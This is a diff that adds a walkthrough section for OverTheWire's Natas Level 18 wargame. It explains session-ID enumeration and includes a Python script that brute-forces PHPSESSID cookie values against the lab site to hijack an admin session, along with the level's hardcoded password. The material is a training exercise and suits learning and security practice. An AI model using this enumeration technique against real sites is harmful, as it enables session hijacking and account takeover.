@@ -542,8 +542,51 @@ This will gradually build the password.
 
 ### Natas Level 18 → Level 19
 **Key Takeaways**  
+This level demonstrates **session enumeration** / insecure session handling. Predictable or enumerable session identifiers (here PHPSESSID) let an attacker impersonate other users (e.g., an admin).
 
 **Procedure**
+
+1. Log in using the username `natas18` and the password from Level 17.
+   
+2. Inspect the site — there is functionality that treats a `PHPSESSID` cookie as the session identifier and displays different content depending on the session (e.g., an admin message).
+
+3. If session IDs are small integers or otherwise enumerable, iterate through plausible PHPSESSID values and request the page with each one.
+
+4. When you find a session that shows the admin content, the page will reveal the password for natas19. Save it and move on.
+
+5. The script logic:
+
+```
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import requests
+from requests.auth import HTTPBasicAuth
+
+username = "natas18"
+password = "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
+url = f"http://{username}.natas.labs.overthewire.org/"
+
+session = requests.Session()
+auth = HTTPBasicAuth(username, password)
+
+for session_id in range(1, 641):
+    try:
+        resp = session.get(url, cookies={"PHPSESSID": str(session_id)}, auth=auth, timeout=8)
+    except requests.RequestException as e:
+        print(f"[!] Request error for PHPSESSID={session_id}: {e}")
+        continue
+
+    content = resp.text
+    if "You are an admin" in content:
+        print("Got it! PHPSESSID =", session_id)
+        print(content)
+        break
+    else:
+        print("trying", session_id)
+```
+
+This will brute force all session IDs to find the one for the `admin`.
 
 
 
